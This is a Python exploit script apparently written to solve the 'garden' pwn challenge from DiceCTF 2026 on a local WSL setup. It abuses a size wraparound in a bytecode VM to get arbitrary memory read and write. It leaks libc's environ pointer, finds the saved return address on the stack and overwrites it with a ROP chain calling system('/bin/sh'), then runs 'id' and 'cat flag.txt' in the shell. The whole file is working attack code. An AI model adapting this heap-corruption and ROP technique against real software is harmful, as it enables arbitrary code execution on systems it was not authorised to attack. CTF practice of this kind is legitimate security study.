#!/usr/bin/env python3
import re
import subprocess
from pathlib import Path

# Opcodes
PUSH_NUM_ARRAY = 0
SET_ELEM_NUM = 9
PRINT_NUM_ARRAY = 10
GET_OFFHEAP_NUM = 11
SET_OFFHEAP_NUM = 12
NEW_OFFHEAP_OBJ = 15
DUP = 16
DROP = 18

# Local WSL target
WSL_DIR = "/mnt/d/Documents/CTF_competition/DiceCTF 2026/Pwn/garden"
RUN_CMD = f"cd '{WSL_DIR}' && env LD_PRELOAD=./mmap_shim.so setarch x86_64 -R ./garden"

# Constants for this local setup
WRAP_SIZE = 0x3FFFFFF9
LIBC_BASE = 0x7FFFF7DA6000
LIBC_ENVIRON = LIBC_BASE + 0x20AD58
CALL_MAIN_RET = LIBC_BASE + 0x2A1CA

RET_GADGET = LIBC_BASE + 0x2882F
POP_RDI_RET = LIBC_BASE + 0x10F78B
BIN_SH = LIBC_BASE + 0x1CB42F
SYSTEM = LIBC_BASE + 0x58750


def push_num(ops, value):
    ops.extend([PUSH_NUM_ARRAY, 1, value & 0xFFFFFFFF])


def push_arr(ops, values):
    ops.extend([PUSH_NUM_ARRAY, len(values)])
    ops.extend(v & 0xFFFFFFFF for v in values)


def build_setup(ptr, obj_size):
    """Create off-heap arbitrary R/W setup using the known wraparound primitive."""
    ops = []
    ptr_lo = ptr & 0xFFFFFFFF
    ptr_hi = (ptr >> 32) & 0xFFFFFFFF

    push_num(ops, WRAP_SIZE)
    ops.append(NEW_OFFHEAP_OBJ)

    # Clear OFF_HEAP flag (write 0x00000005 to off-heap header via overlap)
    push_num(ops, 5)
    # Overwrite off-heap struct fields: data pointer + obj_size
    push_arr(ops, [ptr_lo, ptr_hi, obj_size, 0])
    ops.append(DROP)

    # Restore OFF_HEAP flag: 0x00040005
    push_num(ops, 0x00040005)
    push_num(ops, 0)
    ops.append(SET_ELEM_NUM)
    return ops


def build_read_words(ptr, count):
    ops = build_setup(ptr, max(count + 0x20, 0x200))
    for i in range(count):
        ops.append(DUP)
        push_num(ops, i)
        ops.append(GET_OFFHEAP_NUM)
        ops.append(PRINT_NUM_ARRAY)
    return ops


def build_write_chain(ret_slot):
    chain = [RET_GADGET, POP_RDI_RET, BIN_SH, SYSTEM]
    dwords = []
    for q in chain:
        dwords.append(q & 0xFFFFFFFF)
        dwords.append((q >> 32) & 0xFFFFFFFF)

    ops = build_setup(ret_slot, 0x100)
    for idx, val in enumerate(dwords):
        ops.append(DUP)
        push_num(ops, val)
        push_num(ops, idx)
        ops.append(SET_OFFHEAP_NUM)
    return ops


def run_vm(words, trailing=b""):
    payload = (
        str(len(words)).encode()
        + b"\n"
        + b"\n".join(str(x).encode() for x in words)
        + b"\n"
        + trailing
    )
    proc = subprocess.Popen(
        ["wsl", "-e", "/bin/sh", "-lc", RUN_CMD],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    out, _ = proc.communicate(payload, timeout=30)
    return out.decode(errors="replace")


def extract_printed_numbers(output):
    return [int(x) for x in re.findall(r"Numeric array of length 1: \[(\d+)\]", output)]


def ensure_shim():
    if Path("mmap_shim.so").exists():
        return
    if not Path("mmap_shim.c").exists():
        raise RuntimeError("Missing mmap_shim.c (required on this WSL kernel).")
    cmd = f"cd '{WSL_DIR}' && gcc -shared -fPIC mmap_shim.c -o mmap_shim.so -ldl"
    subprocess.check_call(["wsl", "-e", "/bin/sh", "-lc", cmd])


def main():
    ensure_shim()

    # 1) Leak environ pointer
    leak_out = run_vm(build_read_words(LIBC_ENVIRON, 2))
    nums = extract_printed_numbers(leak_out)
    if len(nums) < 2:
        raise RuntimeError("Failed to leak environ.")
    environ = nums[0] | (nums[1] << 32)
    print(f"[+] environ = {hex(environ)}")

    # 2) Find saved RIP slot by scanning around environ for __libc_start_call_main return addr
    base = environ - 0x300
    scan_out = run_vm(build_read_words(base, 192))
    vals = extract_printed_numbers(scan_out)
    want_lo = CALL_MAIN_RET & 0xFFFFFFFF
    want_hi = (CALL_MAIN_RET >> 32) & 0xFFFFFFFF

    ret_slot = None
    for i in range(len(vals) - 1):
        if vals[i] == want_lo and vals[i + 1] == want_hi:
            ret_slot = base + 4 * i
            break
    if ret_slot is None:
        raise RuntimeError("Failed to locate saved RIP slot.")
    print(f"[+] saved RIP slot = {hex(ret_slot)}")

    # 3) Overwrite return chain and send shell commands
    final_out = run_vm(
        build_write_chain(ret_slot),
        trailing=b"id\ncat flag.txt\n",
    )
    print(final_out)


if __name__ == "__main__":
    main()
